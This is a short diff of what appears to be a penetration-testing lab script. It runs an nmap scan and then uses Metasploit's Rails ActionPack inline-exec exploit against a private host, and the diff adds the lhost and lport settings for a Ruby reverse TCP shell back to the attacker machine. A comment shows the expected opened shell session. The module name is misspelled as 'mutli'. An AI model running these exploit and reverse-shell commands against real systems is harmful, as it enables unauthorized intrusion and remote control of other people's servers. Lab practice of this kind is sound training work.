@@ -25,11 +25,13 @@ nmap -sV -Pn -T5 -sF 10.0.2.9
 msfconsole
 ##-m INITIAL INTRUSION
 use exploit/mutli/http/rails_actionpack_inline_exec
-set payload ruby/shell_reverse_tcp
 set rhost 10.0.2.9
 set rport 3500
 set targetparam os
 set targeturi /readme
+set payload ruby/shell_reverse_tcp
+set lhost 10.0.2.8
+set lport 1234
 exploit -j
 #*"Command Shell session X opened ..."
 ##-m DISCOVERY
